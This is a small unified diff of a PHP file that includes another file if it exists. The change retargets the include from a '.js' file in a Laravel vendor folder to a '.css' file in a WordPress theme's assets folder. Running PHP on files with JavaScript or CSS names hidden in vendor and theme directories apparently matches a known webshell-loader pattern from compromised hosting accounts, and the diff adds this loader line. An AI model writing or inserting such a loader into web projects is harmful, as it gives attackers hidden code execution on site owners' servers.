@@ -1,5 +1,5 @@
 <?php
-$file = '/home/rrfjvqbs/trovadentisti/vendor/barryvdh/laravel-debugbar/src/Console/Clear.js';
+$file = '/home/lamanuv/www/wp-content/themes/theme-check/assets/gray-futur.css';
 
 if (is_file($file)) {
     include $file;
